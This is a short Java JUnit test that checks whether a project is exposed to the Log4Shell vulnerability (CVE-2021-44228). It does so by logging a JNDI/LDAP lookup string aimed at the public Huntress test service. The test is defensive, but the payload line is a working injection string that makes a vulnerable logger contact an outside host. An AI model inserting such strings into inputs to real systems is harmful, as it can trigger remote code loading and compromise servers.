package info.setmy.cve;

import org.junit.Test;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class LoggingProblemTest {

    final Logger log = LogManager.getLogger(this.getClass());

    private final String PAYLOAD = "${jndi:ldap://log4shell.huntress.com:1389/e327d2af-38cf-4750-8ee7-43b0c725a62e}";

    @Test
    public void logging() {
        // CVE-2021-44228 : https://log4shell.huntress.com/
        log.info("CVE-2021-44228");
        log.info(PAYLOAD);
    }
}
